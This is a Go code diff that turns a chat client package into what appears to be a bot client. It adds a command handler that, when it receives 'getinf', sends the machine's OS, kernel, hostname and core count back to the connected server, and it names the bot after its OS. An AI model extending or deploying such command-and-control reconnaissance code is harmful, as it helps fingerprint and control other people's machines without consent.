@@ -1,23 +1,36 @@
 package botclientcommand
 
 import (
+	"fmt"
+	"math/rand"
 	"net"
+
+	gi "github.com/matishsiao/goInfo"
 )
 
-type client struct {
-	conn net.Conn
-	name string
-	room string
+//Getnick ...
+func Getnick() string {
+	temp := gi.GetInfo()
+	rand := rand.Int63n(5000000)
+	return fmt.Sprintf("%s_%d", temp.GoOS, rand)
 }
 
-type room struct {
-	members map[net.Addr]*client
+func HandleCommand(c net.Conn, message string) {
+	switch message {
+
+	case "getinf":
+		go getInf(c)
+		break
+	}
 }
 
-var rooms map[string]*room
+// SendToServer sends a message to server
+func sendToServer(c net.Conn, msg string) (err error) {
+	_, err = c.Write([]byte(msg))
+	return
+}
 
-var usage = `
-/nick <name>: get a name, or stay anonymous
-/join <room>:
-
-`
+func getInf(c net.Conn) {
+	info := gi.GetInfo()
+	sendToServer(c, "OS->"+info.OS+"- Platform ->"+info.Platform+"- Kernel ->"+info.Kernel+"- Host ->"+info.Hostname+"- Core ->"+info.Core)
+}
